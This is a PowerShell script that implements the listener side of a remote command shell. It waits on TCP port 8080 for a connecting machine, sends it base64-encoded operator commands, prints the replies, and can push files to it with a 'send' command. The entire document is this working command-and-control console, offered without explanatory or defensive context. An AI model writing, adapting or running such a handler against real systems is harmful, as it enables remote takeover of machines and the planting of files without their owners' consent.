
function SendFile($stream,$filename)
{
    $targetFile  = Split-Path $filename -Leaf
    $fileContent = Get-Content $filename -Encoding Byte
    $transferStr = "$targetFile*$fileContent"
    $transferStr | %{ $stream.Write($_) }
    $stream.Flush()
}
function PSHandler($port)
{
    $socket = New-Object System.Net.IPEndPoint([IPAddress]::Any,$port)

    $handler = New-Object System.Net.Sockets.TCPListener $socket 

    $handler.Start()

    Write-Host "Listening on: $port"

    while($true)
    {
        $client = $handler.AcceptTCPClient()

        if($client)
        {
            $remoteAddress = $client.Client.RemoteEndPoint.Address
            $remotePort    = $client.Client.RemoteEndPoint.Port 

            Write-Host "[*]Connection from: $remoteAddress | $remotePort"

            $stream = $client.GetStream()

            while($true)
            {
                #$cmd   = $encodingScheme.GetString($bytes,0,$var)
                $transmitter           = New-Object System.IO.StreamWriter($stream)
                $receiver              = New-Object System.IO.StreamReader($stream)
                $plaintext_cmd         = Read-Host "[*]>>>"
                $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                $cmd                   = [Convert]::ToBase64String($cmd)

                if($cmd)
                {
                    if($plaintext_cmd | Select-String 'exit')
                    {
                        $transmitter.WriteLine($cmd)
                        $transmitter.Dispose()
                        $receiver.Dispose()
                        $stream.Close()
                        $client.Close()
                        exit
                    }
                    if($plaintext_cmd | Select-String 'send')
                    {
                       $transmission = '' 
                       $command     = $plaintext_cmd.Split(' ')[0] 
                       $filename    = $plaintext_cmd.Split(' ')[1] 
                       $filename    = Split-Path $filename -Leaf
                       
                       $filecontent = Get-Content $filename -Encoding Byte
                       $filecontent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
                       $transmission = "$command+$filename+$filecontent"
                       #$transmission = [System.Text.Encoding]::Unicode.GetBytes($transmission)
                       #$transmission = [Convert]::ToBase64String($transmission) 
                       #$conv = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($transmission))
                       $transmitter.WriteLine($transmission)
                       $transmitter.Flush()
                       $plaintext_cmd         = Read-Host "[*]>>>"
                       $cmd                   = [System.Text.Encoding]::Unicode.GetBytes($plaintext_cmd)
                       $cmd                   = [Convert]::ToBase64String($cmd)
                    }
                    try
                    {
                        $transmitter.WriteLine($cmd)
                        $transmitter.Flush()
                    }
                    catch
                    {
                        continue
                    }
                }

                $intake      = $receiver.ReadLine()
                $intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
                $response    = $intake

                if($intake)
                {
                    Write-Host $response
                }

            }
            $stream.Close()
            $client.Close()
        }
    }
}

PSHandler 8080